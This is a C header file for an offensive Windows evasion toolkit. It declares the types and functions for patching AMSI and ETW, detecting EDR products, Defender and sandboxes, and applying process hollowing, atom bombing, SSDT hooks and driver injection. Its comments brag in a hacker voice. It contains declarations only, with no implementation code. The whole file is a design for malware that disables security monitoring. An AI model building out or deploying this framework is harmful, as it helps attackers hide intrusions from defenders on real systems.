#ifndef INTELLIGENT_BYPASS_H
#define INTELLIGENT_BYPASS_H

#include "common_defines.h"

// ========================================================================
// INTELLIGENT BYPASS v1.0 - "Smart Evasion for Smart Defenders"
// "When your bypass is smarter than their detection" - Elite Hacker
// ========================================================================

// Bypass technique types
typedef enum _BYPASS_TECHNIQUE_TYPE {
    BYPASS_TYPE_AMSI = 0x00000001,      // AMSI bypass techniques
    BYPASS_TYPE_ETW = 0x00000002,       // ETW bypass techniques
    BYPASS_TYPE_COMBINED = 0x00000004,  // Combined AMSI+ETW techniques
    BYPASS_TYPE_HARDWARE = 0x00000008,  // Hardware-based bypasses
    BYPASS_TYPE_KERNEL = 0x00000010,    // Kernel-level bypasses
} BYPASS_TECHNIQUE_TYPE;

// Specific bypass methods
typedef enum _BYPASS_METHOD {
    // AMSI Bypass Methods
    BYPASS_AMSI_PATCH_SCAN_BUFFER = 1,      // Patch AmsiScanBuffer
    BYPASS_AMSI_PATCH_UTILS = 2,            // Patch amsi.dll!AmsiUtils
    BYPASS_AMSI_CONTEXT_CORRUPTION = 3,     // Corrupt AMSI context
    BYPASS_AMSI_PROVIDER_UNHOOK = 4,        // Unhook AMSI provider
    BYPASS_AMSI_MEMORY_PROTECTION = 5,      // Change memory protection
    BYPASS_AMSI_DLL_HIJACKING = 6,          // DLL hijacking
    
    // ETW Bypass Methods
    BYPASS_ETW_PATCH_TRACE_CONTROL = 10,    // Patch NtTraceControl
    BYPASS_ETW_PATCH_CREATE_EVENT = 11,     // Patch EtwpCreateEtwEvent
    BYPASS_ETW_PROVIDER_DISABLE = 12,       // Disable ETW providers
    BYPASS_ETW_SESSION_HIJACK = 13,         // Hijack ETW session
    BYPASS_ETW_CALLBACK_REMOVAL = 14,       // Remove ETW callbacks
    
    // Combined/Advanced Methods
    BYPASS_HEAVEN_GATE_TRANSITION = 20,     // WoW64 Heaven's Gate
    BYPASS_MANUAL_DLL_LOADING = 21,         // Manual DLL loading
    BYPASS_PROCESS_HOLLOWING = 22,          // Process hollowing
    BYPASS_ATOM_BOMBING = 23,               // Atom bombing technique
    
    // Hardware-based Methods
    BYPASS_HARDWARE_BREAKPOINT = 30,        // Hardware breakpoint evasion
    BYPASS_PERFORMANCE_COUNTER = 31,        // Performance counter manipulation
    BYPASS_CACHE_TIMING = 32,               // Cache timing attacks
    
    // Kernel Methods
    BYPASS_KERNEL_CALLBACK_HOOK = 40,       // Kernel callback hooking
    BYPASS_SSDT_HOOK = 41,                  // SSDT hooking
    BYPASS_DRIVER_INJECTION = 42,           // Driver injection
} BYPASS_METHOD;

// Windows version compatibility
typedef struct _WINDOWS_VERSION_INFO {
    DWORD major_version;        // Major version (6, 10, etc.)
    DWORD minor_version;        // Minor version
    DWORD build_number;         // Build number
    BOOL is_server;             // Server edition?
    BOOL has_defender;          // Windows Defender present?
    BOOL has_wdac;              // Windows Defender Application Control?
    BOOL has_hvci;              // Hypervisor-protected Code Integrity?
    BOOL has_cet;               // Intel CET (Control-flow Enforcement Technology)?
    BOOL has_cfg;               // Control Flow Guard?
} WINDOWS_VERSION_INFO, *PWINDOWS_VERSION_INFO;

// Bypass technique descriptor
typedef struct _BYPASS_TECHNIQUE {
    BYPASS_METHOD method;                   // Specific bypass method
    BYPASS_TECHNIQUE_TYPE type;             // Type of bypass
    LPCSTR name;                            // Human-readable name
    LPCSTR description;                     // Detailed description
    
    // Compatibility and effectiveness
    DWORD min_windows_version;              // Minimum Windows version (0x0601 = Win7)
    DWORD max_windows_version;              // Maximum Windows version (0 = no limit)
    DWORD effectiveness_score;              // Effectiveness (0-100)
    DWORD stealth_score;                    // Stealth level (0-100)
    DWORD reliability_score;                // Reliability (0-100)
    
    // Requirements and constraints
    BOOL requires_elevation;                // Need admin privileges?
    BOOL requires_debug_privilege;          // Need debug privilege?
    BOOL requires_wow64;                    // WoW64 required?
    BOOL works_with_defender;               // Works with Defender enabled?
    BOOL works_with_edr;                    // Works with EDR present?
    
    // Implementation details
    PVOID target_module;                    // Target module (amsi.dll, ntdll.dll, etc.)
    LPCSTR target_function;                 // Target function name
    DWORD patch_offset;                     // Offset to patch (if applicable)
    BYTE original_bytes[16];                // Original bytes to restore
    BYTE patch_bytes[16];                   // Patch bytes
    SIZE_T patch_size;                      // Size of patch
    
    // Function pointers for implementation
    BOOL (*pfnInitialize)(struct _BYPASS_TECHNIQUE* technique);
    NTSTATUS (*pfnExecute)(struct _BYPASS_TECHNIQUE* technique);
    BOOL (*pfnVerify)(struct _BYPASS_TECHNIQUE* technique);
    VOID (*pfnCleanup)(struct _BYPASS_TECHNIQUE* technique);
} BYPASS_TECHNIQUE, *PBYPASS_TECHNIQUE;

// Bypass context - tracks active bypasses
typedef struct _BYPASS_CONTEXT {
    // Environment information
    WINDOWS_VERSION_INFO windows_info;
    BOOL defender_active;
    BOOL edr_detected;
    WCHAR edr_product[64];
    DWORD hook_count;
    
    // Active bypasses
    BYPASS_TECHNIQUE active_bypasses[16];
    DWORD active_count;
    
    // Statistics
    DWORD total_attempts;
    DWORD successful_bypasses;
    DWORD failed_attempts;
    LARGE_INTEGER start_time;
    
    // State tracking
    BOOL amsi_bypassed;
    BOOL etw_bypassed;
    BOOL is_initialized;
} BYPASS_CONTEXT, *PBYPASS_CONTEXT;

// Global bypass context
extern BYPASS_CONTEXT g_bypass_ctx;

// ========================================================================
// INTELLIGENT BYPASS API - "Smarter than your average bypass"
// ========================================================================

// Initialize the intelligent bypass system
BOOL IntelligentBypass_Initialize(VOID);

// Analyze environment and select optimal bypass techniques
NTSTATUS IntelligentBypass_AnalyzeEnvironment(PWINDOWS_VERSION_INFO windows_info);

// Select best bypass techniques for current environment
DWORD IntelligentBypass_SelectOptimalTechniques(
    BYPASS_TECHNIQUE_TYPE desired_types,
    PBYPASS_TECHNIQUE* selected_techniques,
    DWORD max_techniques
);

// Execute selected bypass techniques
NTSTATUS IntelligentBypass_ExecuteTechniques(
    PBYPASS_TECHNIQUE techniques,
    DWORD technique_count
);

// Verify that bypasses are still active
BOOL IntelligentBypass_VerifyBypasses(VOID);

// Cleanup and restore original state
VOID IntelligentBypass_Cleanup(VOID);

// ========================================================================
// ENVIRONMENT ANALYSIS - "Know thy enemy"
// ========================================================================

// Detect Windows version and features
BOOL IntelligentBypass_DetectWindowsVersion(PWINDOWS_VERSION_INFO version_info);

// Detect Windows Defender status
BOOL IntelligentBypass_DetectDefender(VOID);

// Detect EDR products
BOOL IntelligentBypass_DetectEDR(PWCHAR edr_product, SIZE_T buffer_size);

// Analyze hook landscape
DWORD IntelligentBypass_AnalyzeHooks(VOID);

// Check for virtualization/sandbox
BOOL IntelligentBypass_DetectVirtualization(VOID);

// ========================================================================
// BYPASS TECHNIQUE IMPLEMENTATIONS - "The arsenal"
// ========================================================================

// AMSI Bypass Techniques
NTSTATUS IntelligentBypass_AMSI_PatchScanBuffer(VOID);
NTSTATUS IntelligentBypass_AMSI_PatchUtils(VOID);
NTSTATUS IntelligentBypass_AMSI_CorruptContext(VOID);
NTSTATUS IntelligentBypass_AMSI_UnhookProvider(VOID);

// ETW Bypass Techniques
NTSTATUS IntelligentBypass_ETW_PatchTraceControl(VOID);
NTSTATUS IntelligentBypass_ETW_PatchCreateEvent(VOID);
NTSTATUS IntelligentBypass_ETW_DisableProviders(VOID);

// Combined Techniques
NTSTATUS IntelligentBypass_HeavenGateTransition(VOID);
NTSTATUS IntelligentBypass_ManualDLLLoading(VOID);

// Hardware-based Techniques
NTSTATUS IntelligentBypass_HardwareBreakpointEvasion(VOID);
NTSTATUS IntelligentBypass_CacheTimingAttack(VOID);

// ========================================================================
// UTILITY FUNCTIONS - "The supporting cast"
// ========================================================================

// Get module base address with stealth
PVOID IntelligentBypass_GetModuleBase(LPCWSTR module_name);

// Find function address with anti-hook checks
PVOID IntelligentBypass_GetFunctionAddress(PVOID module_base, LPCSTR function_name);

// Check if function is hooked
BOOL IntelligentBypass_IsFunctionHooked(PVOID function_address);

// Apply memory patch with validation
NTSTATUS IntelligentBypass_ApplyPatch(
    PVOID target_address,
    PBYTE patch_bytes,
    SIZE_T patch_size,
    PBYTE original_bytes
);

// Restore original bytes
NTSTATUS IntelligentBypass_RestorePatch(
    PVOID target_address,
    PBYTE original_bytes,
    SIZE_T patch_size
);

// ========================================================================
// LOGGING AND MONITORING - "Document your victories"
// ========================================================================

// Log bypass attempt
VOID IntelligentBypass_LogAttempt(BYPASS_METHOD method, NTSTATUS result);

// Log environment analysis
VOID IntelligentBypass_LogEnvironmentAnalysis(PWINDOWS_VERSION_INFO version_info);

// Log hook detection
VOID IntelligentBypass_LogHookDetection(LPCSTR function_name, BOOL is_hooked);

// Generate bypass report
VOID IntelligentBypass_GenerateReport(VOID);

// ========================================================================
// ADVANCED FEATURES - "Next level evasion"
// ========================================================================

// Adaptive bypass - change techniques if detected
NTSTATUS IntelligentBypass_AdaptiveTechniques(VOID);

// Real-time monitoring of bypass effectiveness
VOID IntelligentBypass_MonitorEffectiveness(VOID);

// Self-healing bypasses - automatically restore if overwritten
NTSTATUS IntelligentBypass_SelfHealingMode(BOOL enable);

// Bypass technique rotation - cycle through methods
NTSTATUS IntelligentBypass_RotateTechniques(VOID);

#endif // INTELLIGENT_BYPASS_H 